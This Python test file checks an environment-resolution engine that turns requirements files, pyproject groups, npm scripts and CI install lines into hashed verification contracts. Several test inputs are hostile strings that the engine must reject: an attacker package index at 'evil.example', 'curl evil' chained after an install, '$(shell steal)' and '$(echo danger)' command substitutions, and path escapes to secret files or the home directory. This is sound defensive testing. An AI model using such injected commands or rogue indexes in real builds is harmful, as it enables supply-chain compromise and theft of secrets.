"""Pure contracts; these results never count as real/native acceptance."""
import hashlib
import json
from pathlib import Path

import pytest

from app.environment_engine.contracts import EnvironmentBinding, VerificationEnvironmentContract
from app.environment_engine.resolver import resolve_contract
from app.environment_engine.source import FrozenSource, ResolutionError
from app.environment_engine.python import requirements, pep621
from app.provenance import content_hash


def evidence(files):
    return {"inventory": sorted(files), "entries": [{"path": p, "content": t,
        "prior_hash": hashlib.sha256(t.encode()).hexdigest()} for p, t in files.items()]}


def binding(commands):
    return EnvironmentBinding(task_id="task", snapshot_hash="a" * 64, source_archive_hash="b" * 64,
        base_commit_sha="c" * 40, plan_version_hash="d" * 64, approved_commands_hash=content_hash(commands),
        target_platform="linux/arm64", runner_image_digest="sha256:" + "e" * 64, sandbox_policy_hash="f" * 64)


def contract(files, commands, ecosystem="python"):
    selected = {"ecosystem": ecosystem, "project_directory": ".", "manifests": ["pyproject.toml"] if ecosystem == "python" else ["package.json"],
        "node_environment": {"package_roots": ["."]}}
    return resolve_contract(binding(commands), commands, selected, evidence(files))


def test_static_is_never_prepared_and_hash_binds_exact_commands():
    files = {"pyproject.toml": '[project]\nname="different"\nversion="1"\n[dependency-groups]\ntest=["ruff==0.11.0", "mypy>=1.10"]\n'}
    commands = [{"command_id": "lint", "argv": ["ruff", "check", "."], "working_directory": "."},
                {"command_id": "types", "argv": ["stubtest", "module"], "working_directory": "."}]
    value = contract(files, commands)
    assert value.admission == "static_admitted", value.unresolved
    assert value.commands[1].distributions == ("mypy",)
    assert value == contract(files, commands)
    data = value.model_dump(mode="json")
    data["binding"]["approved_commands_hash"] = "a" * 64
    with pytest.raises(ValueError):
        VerificationEnvironmentContract.model_validate(data)
    assert "prepared" not in value.model_dump_json()


def test_requirements_relative_constraints_duplicates_and_provenance():
    src = FrozenSource(evidence({"deps/dev.txt": "-r sub/tools.txt\n-r sub/tools.txt\n-c ../pins.txt\n",
        "deps/sub/tools.txt": "mypy>=1\nruff; python_version >= '3.11'\n", "pins.txt": "mypy==1.15.0\nunused==2\n"}))
    values = requirements(src, ["deps/dev.txt"])
    assert [v.distribution for v in values] == ["mypy", "ruff", "mypy", "unused"]
    assert [v.constraint for v in values] == [False, False, True, True]
    assert len(src.refs) == 3


@pytest.mark.parametrize("files,reason", [
    ({"r.txt": "-r r.txt"}, "recursive_include_cycle"),
    ({"r.txt": "-r ../secret.txt"}, "requirements_path_escape"),
    ({"r.txt": "--index-url https://evil.example"}, "requirements_unsafe_directive"),
    ({"r.txt": "x @ https://evil.example/a.whl"}, "requirements_unsafe_directive"),
    ({"r.txt": "-r missing.txt"}, "environment_evidence_missing"),
    ({"r.txt": "ruff==1\n-c pins.txt", "pins.txt": "ruff==2"}, "dependency_version_conflict"),
])
def test_requirements_fail_closed(files, reason):
    with pytest.raises(ResolutionError) as exc:
        requirements(FrozenSource(evidence(files)), ["r.txt"])
    assert exc.value.code == reason


def test_group_include_and_cycle():
    files = {"pyproject.toml": '[project]\nname="a"\n[dependency-groups]\ndev=[{include-group="lint"}]\nlint=["ruff<1"]\n'}
    assert pep621(FrozenSource(evidence(files)), "pyproject.toml")[0].distribution == "ruff"
    files["pyproject.toml"] = files["pyproject.toml"].replace('lint=["ruff<1"]', 'lint=[{include-group="dev"}]')
    with pytest.raises(ResolutionError, match="recursive_include_cycle"):
        pep621(FrozenSource(evidence(files)), "pyproject.toml")


def test_make_safe_literal_and_no_filename_guess():
    files = {"pyproject.toml": '[project]\nname="other"\nversion="1"\n',
        "Makefile": "deps:\n\tpython -m pip install -r config/quality.txt\n",
        "config/quality.txt": "mypy\n"}
    commands = [{"command_id": "types", "argv": ["stubtest", "other"], "working_directory": "."}]
    assert contract(files, commands).admission == "static_admitted"
    files["Makefile"] = "deps:\n\tpython -m pip install -r $(shell steal)\n"
    assert contract(files, commands).unresolved[0].reason_code == "unsupported_dynamic_declaration"


def test_node_literal_chain_cycle_and_dynamic_wrapper():
    commands = [{"command_id": "test", "argv": ["pnpm", "test"], "working_directory": "."}]
    files = {"package.json": json.dumps({"scripts": {"test": "pnpm run actual", "actual": "vitest run"}})}
    value = contract(files, commands, "node")
    assert value.admission == "static_admitted"
    assert value.commands[0].chain == ("package.json#test", "package.json#actual", ".:vitest run")
    files["package.json"] = json.dumps({"scripts": {"test": "node tools/check.js"}})
    files["tools/check.js"] = "import {spawn} from 'node:child_process'; spawn('pnpm', ['install']);"
    assert contract(files, commands, "node").unresolved[0].reason_code == "unsupported_dynamic_installer"
    files["package.json"] = json.dumps({"scripts": {"test": "pnpm test"}})
    assert contract(files, commands, "node").unresolved[0].reason_code == "node_script_cycle"


def test_literal_cd_freezes_nested_dependency_root_and_restores_lifecycle_cwd():
    commands = [{"command_id": "quality", "argv": ["npm", "run", "quality"], "working_directory": "."}]
    files = {"package.json": json.dumps({"scripts": {"prequality": "node before.mjs",
        "quality": "cd tools && npm run check && cd .. && node after.mjs", "postquality": "node post.mjs"}}),
        "tools/package.json": json.dumps({"scripts": {"check": "node check.mjs"}}),
        "tools/package-lock.json": '{"lockfileVersion":3}',
        **{p: "console.log('bounded check')" for p in ["before.mjs", "after.mjs", "post.mjs", "tools/check.mjs"]}}
    value = contract(files, commands, "node")
    assert value.admission == "static_admitted", value.unresolved
    assert value.preparation["independent_directories"] == ["tools"]
    node = value.commands[0]
    assert [(c.working_directory, c.argv) for c in node.leaf_commands] == [
        (".", ("node", "before.mjs")), ("tools", ("node", "check.mjs")),
        (".", ("node", "after.mjs")), (".", ("node", "post.mjs"))]
    assert all(name != "cd" for _, name in node.entrypoints)
    assert node.argv == ("npm", "run", "quality") and node.working_directory == "."


@pytest.mark.parametrize("destination", ["..", "../../private", "/tmp", "~", "t*", "-", "missing"])
def test_literal_cd_never_expands_host_or_unknown_directories(destination):
    commands = [{"command_id": "lint", "argv": ["npm", "run", "lint"], "working_directory": "."}]
    value = contract({"package.json": json.dumps({"scripts": {"lint": f"cd {destination} && node --version"}})}, commands, "node")
    assert value.admission == "unsupported"
    assert value.unresolved[0].reason_code in {"node_script_cwd_unsafe", "node_script_cwd_missing"}


def test_literal_cd_rejects_a_linked_directory_without_reading_it():
    from app.environment_engine.node import script_graph
    data = evidence({"package.json": json.dumps({"scripts": {"check": "cd tools && node --version"}}),
        "tools": "link", "tools/README.md": "must not be read"})
    data["entries"][1]["type"] = "symlink"
    with pytest.raises(ResolutionError, match="node_script_cwd_unsafe"):
        script_graph(FrozenSource(data), ("npm", "run", "check"), ".")


def test_old_node_contract_keeps_exact_hash_without_added_leaf_field():
    path = Path(__file__).parents[1] / "docs/acceptance/universal-environment-v1/D-node-02/command-graph.json"
    frozen = json.loads(path.read_text())
    old = frozen["verification_contract"]
    parsed = VerificationEnvironmentContract.model_validate_json(json.dumps(old))
    assert parsed.model_dump(mode="json") == old
    assert parsed.contract_hash == frozen["verification_contract_hash"]


def test_nested_manager_preserves_missing_frozen_evidence_and_rejects_invalid_metadata():
    from app.environment_engine.node import script_graph
    files = {"package.json": json.dumps({"scripts": {"quality": "npm --prefix tools run check"}}),
        "tools/package.json": json.dumps({"scripts": {"check": "node --version"}})}
    source = FrozenSource(evidence(files))
    source.entries.pop("tools/package.json")
    with pytest.raises(ResolutionError, match="environment_evidence_missing"):
        script_graph(source, ("npm", "run", "quality"), ".")
    files["tools/package.json"] = "[]"
    with pytest.raises(ResolutionError, match="node_script_schema_invalid"):
        script_graph(FrozenSource(evidence(files)), ("npm", "run", "quality"), ".")


def test_hash_mismatch_and_symlink_are_never_missing_retry():
    data = evidence({"r.txt": "ruff"})
    data["entries"][0]["prior_hash"] = "0" * 64
    with pytest.raises(ResolutionError, match="source_hash_mismatch"):
        requirements(FrozenSource(data), ["r.txt"])
    data = evidence({"r.txt": "ruff"})
    data["entries"][0]["type"] = "symlink"
    with pytest.raises(ResolutionError, match="source_symlink_unsupported"):
        requirements(FrozenSource(data), ["r.txt"])


def test_new_projection_types_a_legacy_unsupported_gap_without_reinterpreting_old_plans():
    from app.execution_preflight import inspect_environment
    selected = {"status": "unsupported", "reason": "No admitted dependency recipe", "manifests": []}
    assert inspect_environment(selected, {"entries": []}) == selected
    current = inspect_environment(selected, {"entries": []}, engine_version="upeve-v1")
    assert current["reason_code"] == "environment_recipe_unsupported"
    assert current["readiness"]["static_admitted"] is False
    assert current["readiness"]["baseline_verified"] == "unverified"
    builtin = {"status": "builtin", "reason": "Use image tools", "manifests": []}
    assert inspect_environment(builtin, {"entries": []}) == builtin
    assert inspect_environment(builtin, {"entries": []}, engine_version="upeve-v1")["status"] == "unsupported"


def test_unrecognized_adapter_cannot_reinterpret_a_frozen_recipe():
    commands = [{"command_id": "types", "argv": ["stubtest", "different_module"], "working_directory": "."}]
    files = {"pyproject.toml": '[project]\nname="unrelated_package"\nversion="1"\n[dependency-groups]\ntest=["mypy"]\n'}
    value = contract(files, commands).model_dump(mode="json")
    value["resolver_versions"]["adapter"] = "python-toolchain-v999"
    with pytest.raises(ValueError, match="environment_adapter_version_unsupported"):
        VerificationEnvironmentContract.model_validate_json(json.dumps(value))


def test_literal_ci_requirements_keep_inline_versions_constraints_lines_and_root_cwd():
    from app.environment_engine.python import declared_pip_inputs
    files = {".github/workflows/checks.yml": "jobs:\n  test:\n    steps:\n      - run: |\n          python -m pip install -U 'ruff>=0.8,<1' -r deps/tools.txt --constraint=pins.txt\n",
        "deps/tools.txt": "mypy>=1\n", "pins.txt": "mypy==1.15.0\nunused==4\n"}
    source = FrozenSource(evidence(files))
    roots, constraints, inline = declared_pip_inputs(source, ".")
    assert roots == ["deps/tools.txt"] and constraints == ["pins.txt"]
    assert inline[0].requirement == "ruff<1,>=0.8"
    assert inline[0].source.path == ".github/workflows/checks.yml" and inline[0].line == 5
    all_values = [*inline, *requirements(source, roots, constraint_roots=constraints)]
    assert [(d.distribution, d.constraint) for d in all_values] == [("ruff", False), ("mypy", False), ("mypy", True), ("unused", True)]


@pytest.mark.parametrize("fragment", ["ruff > result", "ruff && curl evil", "--index-url https://evil.example ruff", "-e ../other", "ruff $(echo danger)"])
def test_inline_ci_shell_and_installer_options_are_not_interpreted(fragment):
    from app.environment_engine.python import declared_pip_inputs
    source = FrozenSource(evidence({".github/workflows/checks.yml": "- run: pip install " + fragment + "\n"}))
    with pytest.raises(ResolutionError):
        declared_pip_inputs(source, ".")


def test_selected_project_self_install_is_not_an_external_dependency_or_host_execution():
    from app.environment_engine.python import declared_pip_inputs
    source = FrozenSource(evidence({"pkg/Makefile": "env:\n\tpython -m pip install -e .\n\tpip install pytest\n"}))
    roots, constraints, inline = declared_pip_inputs(source, "pkg")
    assert not roots and not constraints
    assert [d.distribution for d in inline] == ["pytest"]


def test_data_cache_capability_is_versioned_declared_and_never_a_package_pin():
    commands = [{"command_id": "types", "argv": ["stubtest", "other"], "working_directory": "."}]
    files = {"pyproject.toml": '[project]\nname="different"\nversion="1"\n[dependency-groups]\ntest=["mypy"]\n'}
    value = contract(files, commands)
    assert value.admission == "static_admitted"
    assert value.preparation["cache_policy"]["directory"] == ".mypy_cache"
    assert value.preparation["cache_policy"]["distribution_versions"] == ["2.4.0", "2.4.1"]
    assert value.preparation["constraints"] == []
    files[".mypy_cache/tracked.py"] = "must not be hidden"
    blocked = contract(files, commands)
    assert blocked.unresolved[0].reason_code == "tool_data_cache_source_conflict"
    files.pop(".mypy_cache/tracked.py")
    files["pyproject.toml"] = files["pyproject.toml"].replace('["mypy"]', '["mypy==1.15.0"]')
    assert contract(files, commands).preparation["cache_policy"] is None


def test_cache_contract_cannot_grant_code_writes_or_unknown_tool_versions():
    from app.sandbox_worker.python_cache import validate_python_cache, MYPY_CACHE_CAPABILITY
    record = {**MYPY_CACHE_CAPABILITY, "distribution_version": "2.4.0", "contract_hash": "a" * 64, "plan_hash": "b" * 64}
    assert validate_python_cache(record) == record
    for key, value in [("directory", "src"), ("max_bytes", 999999999), ("distribution_version", "9")]:
        with pytest.raises(ValueError):
            validate_python_cache({**record, key: value})


def test_cache_metadata_receipt_binds_exact_plan_and_rejects_unknown_distribution(tmp_path):
    from app.sandbox_worker.python_cache import record_python_cache, MYPY_CACHE_CAPABILITY
    metadata = tmp_path / "venv/lib/python3.11/site-packages/mypy-2.4.0.dist-info"
    metadata.mkdir(parents=True)
    (metadata / "METADATA").write_text("Metadata-Version: 2.1\nName: mypy\nVersion: 2.4.0\n")
    plan = {"environment_contract": {"preparation": {"cache_policy": MYPY_CACHE_CAPABILITY}}}
    receipt = record_python_cache(plan, str(tmp_path))
    assert receipt["plan_hash"] == content_hash(plan)
    assert receipt["contract_hash"] == content_hash(plan["environment_contract"])
    with pytest.raises(ValueError, match="receipt_conflict"):
        record_python_cache(plan, str(tmp_path))
    (tmp_path / "python-data-cache.json").unlink()
    (metadata / "METADATA").write_text("Metadata-Version: 2.1\nName: mypy\nVersion: 2.5.0\n")
    with pytest.raises(ValueError, match="tool_version_unsupported"):
        record_python_cache(plan, str(tmp_path))


@pytest.mark.parametrize("case,reason", [("depth", "requirements_depth_limit"),
    ("count", "requirements_count_limit"), ("file_bytes", "environment_evidence_budget")])
def test_untrusted_declaration_budgets_fail_at_the_parser_boundary(case, reason):
    if case == "depth":
        files = {f"r{i}.txt": f"-r r{i + 1}.txt\n" for i in range(9)}
        files["r9.txt"] = "ruff\n"
    elif case == "count":
        files = {"r0.txt": "ruff\n" * 301}
    else:
        files = {"r0.txt": "#" + "x" * (512 * 1024)}
    with pytest.raises(ResolutionError) as error:
        requirements(FrozenSource(evidence(files)), ["r0.txt"])
    assert error.value.code == reason
